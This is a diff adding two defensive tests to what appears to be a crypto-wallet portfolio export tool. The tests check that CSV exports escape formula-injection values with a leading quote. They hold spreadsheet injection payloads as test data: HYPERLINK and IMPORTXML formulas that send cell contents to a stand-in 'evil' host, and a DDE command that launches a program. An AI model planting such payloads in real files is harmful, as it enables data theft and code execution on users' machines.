@@ -525,3 +525,102 @@ async def test_export_full_history_all_snapshots(db_session: AsyncSession) -> No
     assert times == sorted(times), (
         "Full-history export snapshots must be ordered by snapshotted_at ascending"
     )
+
+
+# ---------------------------------------------------------------------------
+# Formula injection defense (T085)
+# ---------------------------------------------------------------------------
+
+
+async def test_csv_portfolio_formula_injection_neutralized(db_session: AsyncSession) -> None:
+    """Malicious token names/symbols starting with '=' are escaped in the portfolio CSV."""
+    malicious_name = "=HYPERLINK(\"http://evil\"&A1,\"click\")"
+    malicious_symbol = "=cmd|'/c calc'!A0"
+
+    wallet_id = await _insert_wallet(db_session, "0x" + "9" * 40)
+    asset_id = await _insert_asset(
+        db_session,
+        token_address="0x" + "b" * 40,
+        symbol=malicious_symbol,
+        name=malicious_name,
+    )
+    await _insert_monitored_pair(db_session, wallet_id=wallet_id, asset_id=asset_id)
+    await _insert_balance_observation(
+        db_session, wallet_id=wallet_id, asset_id=asset_id
+    )
+
+    csv_text = await render_portfolio_csv(db_session)
+
+    data_lines = [ln for ln in csv_text.splitlines() if not ln.startswith("#")]
+    reader = csv.DictReader(data_lines)
+    rows = list(reader)
+
+    wallet_addr = "0x" + "9" * 40
+    match = next(
+        (r for r in rows if r.get("wallet_address", "").lstrip("'").lower() == wallet_addr),
+        None,
+    )
+    assert match is not None, f"Expected a CSV row for wallet {wallet_addr!r}"
+
+    name_cell = match.get("asset_name", "")
+    assert not name_cell.startswith("="), (
+        "asset_name starting with '=' must be escaped in portfolio CSV"
+    )
+    assert name_cell.startswith("'"), (
+        f"asset_name should be prefixed with a single-quote; got {name_cell!r}"
+    )
+
+    symbol_cell = match.get("asset_symbol", "")
+    assert not symbol_cell.startswith("="), (
+        "asset_symbol starting with '=' must be escaped in portfolio CSV"
+    )
+    assert symbol_cell.startswith("'"), (
+        f"asset_symbol should be prefixed with a single-quote; got {symbol_cell!r}"
+    )
+
+
+async def test_csv_history_formula_injection_neutralized(db_session: AsyncSession) -> None:
+    """Malicious token names starting with '+' are escaped in the history CSV."""
+    from audr.operations.exports import render_history_csv
+
+    malicious_name = "+IMPORTXML(CONCAT(\"http://evil/\",SUBSTITUTE(A1,\" \",\"%20\")),\"//\")"
+    base = datetime(2026, 7, 1, 0, 0, 0, tzinfo=UTC)
+
+    wallet_id = await _insert_wallet(db_session, "0x" + "3" * 40)
+    asset_id = await _insert_asset(
+        db_session,
+        token_address="0x" + "4" * 40,
+        symbol="SAFE",
+        name=malicious_name,
+    )
+    snap_id = await _insert_snapshot(db_session, snapshotted_at=base)
+    obs_id = await _insert_balance_observation(
+        db_session, wallet_id=wallet_id, asset_id=asset_id, observed_at=base
+    )
+    await _insert_valuation_line(
+        db_session,
+        snapshot_id=snap_id,
+        wallet_id=wallet_id,
+        asset_id=asset_id,
+        observation_id=obs_id,
+    )
+
+    csv_text = await render_history_csv(db_session)
+
+    data_lines = [ln for ln in csv_text.splitlines() if not ln.startswith("#")]
+    reader = csv.DictReader(data_lines)
+    rows = list(reader)
+
+    match = next(
+        (r for r in rows if r.get("snapshot_id") == str(snap_id)),
+        None,
+    )
+    assert match is not None, f"Expected a CSV row for snapshot {snap_id}"
+
+    name_cell = match.get("asset_name", "")
+    assert not name_cell.startswith("+"), (
+        "asset_name starting with '+' must be escaped in history CSV"
+    )
+    assert name_cell.startswith("'"), (
+        f"asset_name should be prefixed with a single-quote; got {name_cell!r}"
+    )
